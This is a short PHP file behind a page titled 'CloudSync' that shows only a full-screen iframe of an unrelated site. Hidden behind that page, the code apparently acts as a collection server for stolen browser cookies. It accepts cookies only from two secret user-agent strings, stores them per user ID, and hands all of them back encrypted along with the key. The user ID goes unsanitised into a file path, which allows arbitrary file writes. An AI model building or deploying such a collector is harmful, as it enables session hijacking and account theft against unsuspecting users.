<?php

require __DIR__ . '/CrossPlatformCiphers/PHP_CIPHER/index.php';

$IV = substr(md5(random_bytes(10)), 0, 16);
$KEY = substr(md5(random_bytes(10)), 0, 16);

if (!file_exists(__DIR__ . '/users')) {
  mkdir(__DIR__ . '/users', 0777, true);
}

if (!file_exists(__DIR__ . '/users/.htaccess')) {
  file_put_contents(__DIR__ . '/users/.htaccess', 'deny from all');
}

$ua = ['Mozilla/5.0 (Linux; Android 6.0.1; Pixel Experience L3N4R0X Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36', 'Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en; L3N4R0X) Presto/2.12.423 Version/12.16'];
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  if (in_array($_SERVER['HTTP_USER_AGENT'], $ua)) {
    if (isset($_POST['cookie'], $_POST['user_id'])) {
      if (isset($_POST['save'])) {
        file_put_contents(__DIR__ . '/users/' . urldecode(trim($_POST['user_id'])), $_POST['cookie']);
        //echo json_encode(['success' => true]);
      }
    } else if (isset($_POST['load'])) {
      $files = scandir(__DIR__ . '/users');
      $cookies = [$KEY, $IV];
      foreach ($files as $file) {
        if (in_array($file, ['.', '..', '.htaccess'])) continue;
        $read = file_get_contents(__DIR__ . '/users/' . $file);
        $read = PHP_AES_Cipher::encrypt($KEY, $IV, $read);
        $cookies[] = $read;
      }
      header('Content-Type: application/json');
      exit(json_encode($cookies));
    }
  }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CloudSync</title>
</head>

<body>
  <iframe src="http://dimaslanjaka.github.io" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
    Your browser doesn't support iframes
  </iframe>
</body>

</html>